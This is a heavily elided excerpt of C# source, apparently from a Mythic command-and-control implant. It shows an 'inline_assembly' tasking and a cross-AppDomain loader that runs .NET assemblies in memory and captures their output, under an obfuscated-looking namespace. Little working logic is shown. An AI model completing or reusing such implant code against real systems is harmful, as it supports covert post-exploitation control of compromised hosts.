...
using YXBqSVSFInterop.Classes.IO;
using Task = YXBqSVSFInterop.Structs.MythicStructs.Task;
    ...
    public class inline_assembly : Tasking
    {
        ...
        public override void Start()
        {
            ...
            try
            {
                ...
                {
                    resp = CreateTaskResponse("Failed to get YXBqSVSFInterop dependency.", true, "error");
                }
            }
            catch (Exception ex)
            {
...
#region Cross AppDomain Loader
        static void ActivateLoader()
        {
            void OnWrite(object sender, object args)
            {
                ...
                {
                    if (asm2.FullName.StartsWith("YXBqSVSFInterop"))
                    {
                        interop2 = asm2;
                        break;
                    }
                ...
                Type tStringEventArgs = interop2.GetType("YXBqSVSFInterop.Classes.Events.StringDataEventArgs");
            ...
            {
                if (asm.FullName.StartsWith("YXBqSVSFInterop"))
                {
                    interopAsm = asm;
                }
            }
            ...
            Type tWriter = interopAsm.GetType("YXBqSVSFInterop.Classes.IO.EventableStringWriter");
            ...
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("YXBqSVSF"))
                {
